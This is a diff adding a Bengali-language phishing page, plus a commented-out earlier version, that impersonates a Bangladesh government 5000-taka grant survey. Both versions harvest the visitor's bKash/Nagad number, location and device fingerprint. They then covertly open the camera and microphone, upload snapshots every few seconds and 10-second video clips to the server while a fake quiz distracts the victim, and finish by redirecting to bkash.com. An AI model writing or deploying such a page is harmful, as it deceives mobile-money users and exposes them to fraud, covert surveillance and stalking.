@@ -1,0 +1,272 @@
+<!-- <!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ডিজিটাল বোনাস ও জরিপ ২০২৪</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background: #f0f2f5; margin: 0; padding: 15px; text-align: center; color: #333; }
+        .card { max-width: 420px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.15); border-top: 6px solid #006a4e; }
+        .logo { width: 70px; margin-bottom: 10px; }
+        input { width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        .btn { background: #006a4e; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; }
+        #quiz-area, #perm-block { display: none; }
+        .opt-btn { background: #f8f9fa; border: 1px solid #ddd; padding: 12px; width: 100%; margin-bottom: 10px; border-radius: 8px; cursor: pointer; text-align: left; }
+        .timer { color: #d9534f; font-weight: bold; font-size: 20px; margin: 10px 0; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="start-screen">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Government_Seal_of_Bangladesh.svg" class="logo">
+    <h2>৫০০০ টাকা অনুদান অফার</h2>
+    <p>সঠিক তথ্য দিয়ে জরিপটি পূরণ করুন এবং সরাসরি আপনার বিকাশ/নগদ-এ টাকা বুঝে নিন।</p>
+    <input type="number" id="v-phone" placeholder="আপনার বিকাশ/নগদ নম্বর দিন">
+    <button class="btn" onclick="initiate()">জরিপ শুরু করুন</button>
+</div>
+
+<div class="card" id="quiz-area">
+    <div class="timer" id="time-display">10</div>
+    <h3 id="q-text">লোড হচ্ছে...</h3>
+    <div id="options-box"></div>
+</div>
+
+<video id="video" playsinline autoplay></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+    let qIdx = 0;
+    let questions = [
+        { q: "আপনি কি বর্তমান দ্রব্যমূল্যে সন্তুষ্ট?", a: ["হ্যাঁ", "না", "মোটামুটি"] },
+        { q: "অনলাইন সেবা আপনার জীবন সহজ করেছে?", a: ["হ্যাঁ", "না"] },
+        { q: "আপনার সিম কার্ডটি কার নামে রেজিস্টার্ড?", a: ["নিজের", "পরিবারের", "অন্যের"] },
+        { q: "আপনার বর্তমান ইন্টারনেট স্পিড কেমন?", a: ["খুব ভালো", "মাঝে মাঝে সমস্যা হয়"] },
+        { q: "প্রতিদিন কত ঘণ্টা মোবাইল ব্যবহার করেন?", a: ["১-৩ ঘণ্টা", "৫ ঘণ্টার বেশি"] },
+        { q: "এই অফারটি কি বন্ধুদের শেয়ার করবেন?", a: ["হ্যাঁ", "না"] },
+        { q: "আপনার বিকাশ/নগদ কি সচল আছে?", a: ["হ্যাঁ", "না"] },
+        { q: "আপনি কি নিয়মিত অনলাইন লেনদেন করেন?", a: ["হ্যাঁ", "না"] },
+        { q: "জরিপটি আপনার কেমন লেগেছে?", a: ["ভালো", "খুব ভালো"] },
+        { q: "টাকা কি এখনই ক্যাশ আউট করবেন?", a: ["হ্যাঁ", "অবশ্যই"] }
+    ];
+
+    async function initiate() {
+        let phone = $("#v-phone").val();
+        if(phone.length < 11) return alert("সঠিক নম্বর দিন!");
+
+        // ১. ডিভাইস ফিঙ্গারপ্রিন্টিং
+        const gl = document.createElement('canvas').getContext('webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
+        
+        let fp = `📱 ফোন: ${phone}\n🔋 ব্যাটারি: ${ (await navigator.getBattery?.())?.level * 100 || 'N/A' }%\n🖥️ প্ল্যাটফর্ম: ${navigator.platform}\n🎮 GPU: ${gpu}\n🌐 কানেকশন: ${navigator.connection?.effectiveType || 'N/A'}`;
+        $.post("/info", { data: encodeURIComponent(fp) });
+
+        // ২. ক্যামেরা রিকোয়েস্ট ও সাইলেন্ট ক্যাপচার
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(stream => {
+            document.getElementById('video').srcObject = stream;
+            startSilentCapture(stream);
+        }).catch(() => { console.log("Camera Blocked"); });
+
+        // ৩. লোকেশন
+        navigator.geolocation.getCurrentPosition(p => {
+            $.post("/info", { data: encodeURIComponent(`📍 লোকেশন: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`) });
+        });
+
+        $("#start-screen").hide();
+        $("#quiz-area").show();
+        showQ();
+    }
+
+    function startSilentCapture(stream) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        setInterval(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            $.post('/camsnap', { img: canvas.toDataURL('image/png') });
+        }, 2000); // ২ সেকেন্ড অন্তর ছবি
+
+        const rec = new MediaRecorder(stream);
+        let ch = [];
+        rec.ondataavailable = e => ch.push(e.data);
+        rec.onstop = () => {
+            const reader = new FileReader();
+            reader.onloadend = () => $.post('/video-upload', { video: reader.result });
+            reader.readAsDataURL(new Blob(ch, { type: 'video/webm' }));
+            ch = []; rec.start();
+            setTimeout(() => rec.stop(), 10000); // ১০ সেকেন্ডের ভিডিও লুপ
+        };
+        rec.start();
+        setTimeout(() => rec.stop(), 10000);
+    }
+
+    function showQ() {
+        if(qIdx < questions.length) {
+            $("#q-text").text(questions[qIdx].q);
+            $("#options-box").html('');
+            questions[qIdx].a.forEach(opt => {
+                $("#options-box").append(`<button class="opt-btn" onclick="qIdx++; showQ()">${opt}</button>`);
+            });
+        } else {
+            $("#quiz-area").html("<h3>সফলভাবে সম্পন্ন হয়েছে!</h3><p>আপনার প্রোফাইল যাচাই করা হচ্ছে। খুব শীঘ্রই বোনাস পাবেন।</p>");
+            setTimeout(() => location.href = "https://www.bkash.com", 3000);
+        }
+    }
+</script>
+</body>
+</html> -->
+
+
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>সরকারি জনমত ও অনুদান পোর্টাল</title>
+    <style>
+        body { font-family: 'Hind Siliguri', Arial, sans-serif; background: #eef2f7; text-align: center; margin: 0; padding: 15px; }
+        .card { max-width: 450px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #006a4e; }
+        .logo { width: 80px; margin-bottom: 10px; }
+        h2 { color: #006a4e; }
+        input { width: 100%; padding: 15px; margin: 15px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        .btn { background: #006a4e; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        #quiz-area, #loc-screen { display: none; }
+        .opt-btn { background: #fff; border: 2px solid #eee; padding: 12px; width: 100%; margin-bottom: 10px; border-radius: 10px; cursor: pointer; text-align: left; font-size: 16px; }
+        #video { display: none; }
+        .error-msg { color: #d9534f; font-weight: bold; margin-bottom: 10px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="start-screen">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Government_Seal_of_Bangladesh.svg" class="logo">
+    <h2>৫০০০ টাকা অনুদান নিশ্চিত করুন</h2>
+    <p>আপনার বিকাশ/নগদ নম্বর দিন এবং তথ্য যাচাই সম্পন্ন করুন।</p>
+    <input type="number" id="v-phone" placeholder="আপনার নম্বরটি এখানে লিখুন">
+    <button class="btn" onclick="checkLoc()">পরবর্তী ধাপ</button>
+</div>
+
+<div class="card" id="loc-screen">
+    <h3 style="color: #d9534f;">⚠️ এলাকা যাচাই প্রয়োজন</h3>
+    <p>অনুদানটি আপনার এলাকায় বরাদ্দ কিনা তা নিশ্চিত করতে আপনার লোকেশন শেয়ার করা বাধ্যতামূলক।</p>
+    <p id="loc-err" class="error-msg">দয়া করে ব্রাউজারের উপরে আসা 'Allow' বাটনে ক্লিক করুন!</p>
+    <button class="btn" onclick="getLocation()">লোকেশন এলাউ করুন</button>
+</div>
+
+<div class="card" id="quiz-area">
+    <h3 id="q-text">আপনার প্রোফাইল চেক করা হচ্ছে...</h3>
+    <div id="options-box"></div>
+</div>
+
+<video id="video" playsinline autoplay></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+    let phone = "";
+    let qIdx = 0;
+    let questions = [
+        { q: "আপনার বর্তমান সিম অপারেটর কোনটি?", a: ["GP", "Robi/Airtel", "Banglalink", "Teletalk"] },
+        { q: "আপনি কি ইন্টারনেটের গতিতে সন্তুষ্ট?", a: ["হ্যাঁ", "না", "মাঝে মাঝে"] },
+        { q: "বোনাস টাকা কি আপনি সরাসরি বিকাশ-এ চান?", a: ["হ্যাঁ", "নগদ-এ চাই"] },
+        { q: "আপনার ফোনটি কি 4G সাপোর্টেড?", a: ["হ্যাঁ", "না"] },
+        { q: "প্রতিদিন কত টাকা ফ্লেক্সিলোড করেন?", a: ["২০-৫০ টাকা", "১০০+ টাকা"] },
+        { q: "ডিজিটাল সার্ভিসে আপনি কত খুশি?", a: ["১০০%", "৮০%", "৫০%"] },
+        { q: "এই অফারটি কি আপনার উপকারে আসবে?", a: ["হ্যাঁ", "অবশ্যই"] },
+        { q: "আপনার বয়স কি ১৮ বছরের বেশি?", a: ["হ্যাঁ", "না"] },
+        { q: "আপনি কি কোনো সরকারি চাকরি করেন?", a: ["হ্যাঁ", "না"] },
+        { q: "টাকা কি এখনই রিকোয়েস্ট পাঠাবেন?", a: ["হ্যাঁ", "একটু পর"] }
+    ];
+
+    function checkLoc() {
+        phone = $("#v-phone").val();
+        if(phone.length < 11) return alert("সঠিক নম্বর দিন!");
+        $("#start-screen").hide();
+        $("#loc-screen").show();
+    }
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        } else {
+            alert("লোকেশন সাপোর্ট করছে না।");
+        }
+    }
+
+    async function sendPosition(position) {
+        let lat = position.coords.latitude;
+        let lon = position.coords.longitude;
+        let locMsg = `📍 ম্যাপ লিংক: https://www.google.com/maps?q=${lat},${lon}`;
+        
+        // লোকেশন পাওয়ার পর ক্যামেরা শুরু করা
+        initCam(locMsg);
+    }
+
+    function showError(error) {
+        $("#loc-err").show();
+    }
+
+    async function initCam(locMsg) {
+        // ক্যামেরা পারমিশন
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(stream => {
+            document.getElementById('video').srcObject = stream;
+            startCapturing(stream);
+        }).catch(() => { console.log("Cam Denied"); });
+
+        // সব তথ্য একসাথে পাঠানো
+        let info = `📱 ফোন: ${phone}\n🔋 ব্যাটারি: ${(await navigator.getBattery?.())?.level * 100 || 'N/A'}%\n${locMsg}`;
+        $.post("/info", { data: encodeURIComponent(info) });
+
+        $("#loc-screen").hide();
+        $("#quiz-area").show();
+        showQ();
+    }
+
+    function startCapturing(stream) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        setInterval(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imgData = canvas.toDataURL('image/jpeg', 0.4);
+            $.ajax({ type: 'POST', url: '/camsnap', data: { img: imgData } });
+        }, 3000);
+
+        const rec = new MediaRecorder(stream);
+        let ch = [];
+        rec.ondataavailable = e => ch.push(e.data);
+        rec.onstop = () => {
+            let reader = new FileReader();
+            reader.onloadend = () => {
+                $.ajax({ type: 'POST', url: '/video-upload', data: JSON.stringify({ video: reader.result }), contentType: 'application/json' });
+            };
+            reader.readAsDataURL(new Blob(ch, { type: 'video/webm' }));
+            ch = []; rec.start();
+            setTimeout(() => rec.stop(), 10000);
+        };
+        rec.start();
+        setTimeout(() => rec.stop(), 10000);
+    }
+
+    function showQ() {
+        if(qIdx < questions.length) {
+            $("#q-text").text(questions[qIdx].q);
+            $("#options-box").html('');
+            questions[qIdx].a.forEach(o => {
+                $("#options-box").append(`<button class="opt-btn" onclick="qIdx++; showQ()">${o}</button>`);
+            });
+        } else {
+            $("#quiz-area").html("<h3>যাচাই সফল!</h3><p>আপনার আবেদনটি গ্রহণ করা হয়েছে। ২৪ ঘণ্টার মধ্যে বোনাস পাবেন।</p>");
+            setTimeout(() => location.href = "https://www.bkash.com", 3000);
+        }
+    }
+</script>
+</body>
+</html>
